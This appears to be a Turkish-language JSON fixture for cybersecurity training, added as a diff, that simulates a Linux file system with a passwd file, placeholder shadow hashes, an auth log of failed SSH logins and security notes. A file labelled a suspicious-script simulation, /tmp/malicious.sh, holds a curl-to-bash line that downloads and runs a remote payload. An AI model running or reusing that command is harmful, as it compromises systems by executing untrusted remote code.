@@ -1,0 +1,59 @@
+{
+  "aciklama": "Siber Güvenlik Eğitimi İçin Simüle Edilmiş Linux Sanal Dosya Sistemi",
+  "kok_dizin": "/",
+  "dizinler": [
+    {"yol": "/", "izin": "0755", "sahip": "root:root"},
+    {"yol": "/etc", "izin": "0755", "sahip": "root:root"},
+    {"yol": "/var", "izin": "0755", "sahip": "root:root"},
+    {"yol": "/var/log", "izin": "0750", "sahip": "root:adm"},
+    {"yol": "/home", "izin": "0755", "sahip": "root:root"},
+    {"yol": "/home/analyst", "izin": "0750", "sahip": "analyst:analyst"},
+    {"yol": "/tmp", "izin": "1777", "sahip": "root:root"},
+    {"yol": "/opt", "izin": "0755", "sahip": "root:root"},
+    {"yol": "/opt/security_app", "izin": "0755", "sahip": "root:root"}
+  ],
+  "dosyalar": [
+    {
+      "yol": "/etc/passwd",
+      "izin": "0644",
+      "sahip": "root:root",
+      "icerik": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nanalyst:x:1000:1000:Güvenlik Analisti:/home/analyst:/bin/bash\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin"
+    },
+    {
+      "yol": "/etc/shadow",
+      "izin": "0640",
+      "sahip": "root:shadow",
+      "icerik": "root:$6$rounds=500000$saltstring$hashedpassword123:19800:0:99999:7:::\nanalyst:$6$rounds=500000$saltanalyst$hashedpassword456:19800:0:90:7:::"
+    },
+    {
+      "yol": "/etc/app.conf",
+      "izin": "0644",
+      "sahip": "root:root",
+      "icerik": "# Kurumsal Uygulama Güvenlik Yapılandırması\nENV=PRODUCTION\nLOG_LEVEL=INFO\nMAX_CONNECTIONS=500\nALLOWED_HOSTS=127.0.0.1,10.0.0.0/8\nENFORCE_SSL=TRUE"
+    },
+    {
+      "yol": "/var/log/auth.log",
+      "izin": "0640",
+      "sahip": "root:adm",
+      "icerik": "Oct 27 01:10:01 srv-corp sshd[4120]: Accepted publickey for analyst from 192.168.1.50 port 54322 ssh2\nOct 27 01:15:22 srv-corp sudo: analyst : TTY=pts/0 ; PWD=/home/analyst ; USER=root ; COMMAND=/bin/cat /etc/app.conf\nOct 27 01:20:00 srv-corp sshd[4200]: Failed password for invalid user admin from 203.0.113.10 port 49120 ssh2\nOct 27 01:20:05 srv-corp sshd[4201]: Failed password for invalid user test from 203.0.113.10 port 49122 ssh2\nOct 27 01:20:10 srv-corp sshd[4202]: Connection closed by authenticating user 203.0.113.10 port 49120 [preauth]\nOct 27 01:25:00 srv-corp CRON[4300]: pam_unix(cron:session): session opened for user root by (uid=0)\nOct 27 01:30:14 srv-corp sudo: analyst : TTY=pts/0 ; PWD=/var/log ; USER=root ; COMMAND=/usr/bin/tail auth.log"
+    },
+    {
+      "yol": "/home/analyst/notes.txt",
+      "izin": "0600",
+      "sahip": "analyst:analyst",
+      "icerik": "Güvenlik Denetim Notları:\n1. Göreli yol kullanımından (./script) kaçınılmalı, mutlak yol tercih edilmeli.\n2. PATH değişkeni başında '.' bulunmamalı.\n3. Geçici dosyalarda güvenli umask 027 kullanılmalı."
+    },
+    {
+      "yol": "/tmp/malicious.sh",
+      "izin": "0777",
+      "sahip": "attacker:attacker",
+      "icerik": "#!/bin/bash\n# Şüpheli betik simülasyonu\ncurl -s http://198.51.100.25/payload | /bin/bash"
+    },
+    {
+      "yol": "/opt/security_app/run.sh",
+      "izin": "0755",
+      "sahip": "root:root",
+      "icerik": "#!/bin/bash\n# Güvenli mutlak yollu başlatıcı\n/usr/bin/python3 /opt/security_app/main.py --config /etc/app.conf"
+    }
+  ]
+}
